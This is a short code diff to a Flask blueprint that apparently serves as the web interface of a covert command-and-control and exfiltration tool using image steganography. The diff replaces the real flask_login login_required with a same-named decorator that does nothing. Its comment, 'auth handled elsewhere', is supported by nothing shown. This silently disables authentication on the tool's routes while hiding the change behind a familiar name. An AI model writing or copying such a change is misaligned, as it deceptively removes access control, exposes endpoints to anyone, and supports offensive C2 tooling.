@@ -4,13 +4,20 @@ Covert command & control via image steganography
 """
 
 from flask import Blueprint, render_template, request, jsonify, send_file
-from flask_login import login_required
+from functools import wraps
 import sys
 import os
 import base64
 import io
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))
+
+# Simple pass-through decorator (auth handled elsewhere)
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        return f(*args, **kwargs)
+    return decorated
 
 try:
     from stego_c2 import get_stego_c2, StegoMethod, ExfilPlatform
